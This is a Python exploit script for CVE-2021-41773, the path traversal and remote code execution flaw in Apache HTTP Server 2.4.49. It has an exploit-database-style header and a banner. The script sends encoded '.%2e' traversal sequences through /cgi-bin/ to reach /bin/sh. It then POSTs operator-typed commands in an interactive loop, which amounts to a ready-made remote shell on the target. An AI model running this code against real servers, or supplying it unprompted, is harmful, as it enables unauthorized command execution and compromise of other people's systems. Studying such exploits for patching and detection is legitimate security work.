# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Exploit Author: Gaurav Raj https://gauravraj.xyz
# Exploit Modified by Plunder https://www.youtube.com/channel/UCxmRCPu2WFRueQgyhr5Eq5A
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773


#!/usr/bin/python3

import argparse
import requests


def runcmd(target, binary):
    url = 'http://{}'.format(target)
    req = requests.get(url)
    while True:
        cmd = input("\033[1;36m>>> \033[0m")
        if (cmd != 'exit'):
            if ('https' not in req.url):
                url = "http://{}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e{}".format(
                    target, binary)
            else:
                url = "https://{}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e{}".format(
                    target, binary)
            data = "echo Content-Type: text/plain; echo; {}".format(cmd)
            session = requests.Session()
            req = requests.Request(
                method='POST', url=url, data=data).prepare()
            req.url = url
            print(session.send(req).text, end='')

        else:
            exit(0)


def banner(url,binary):
    print(f'''--------------------------------------------------------------------------------------------
|                                  \033[1;32mApache2 2.4.49\033[1;37m - \033[1;31mExploit\033[0m                                |
|                                            Author : Gaurav Raj                           |
|                                            Modified by : Plunder                         |
--------------------------------------------------------------------------------------------

url : {url}
binary used : {binary}
http path traversal url : {"http://"+url+"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e"+binary}
https path traveral url (relative): {"https://"+url+"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e"+binary}
''')


def main():
    parser = argparse.ArgumentParser(description="Apache2 2.4.49 Exploit")
    parser.add_argument(
        '-t', '--target', help='Specify the target IP or Domain. eg: 127.0.0.1 or example.com', required=True)
    parser.add_argument(
        '-b', "--binary", help="Specify the binary file to execute. eg: /bin/sh (/bin/sh by default)", required=False, default="/bin/sh")
    arg = parser.parse_args()
    banner(arg.target,arg.binary)
    try:
        runcmd(arg.target, arg.binary)
    except KeyboardInterrupt:
        exit(1)
    except EOFError:
        exit(1)


if __name__ == '__main__':
    main()
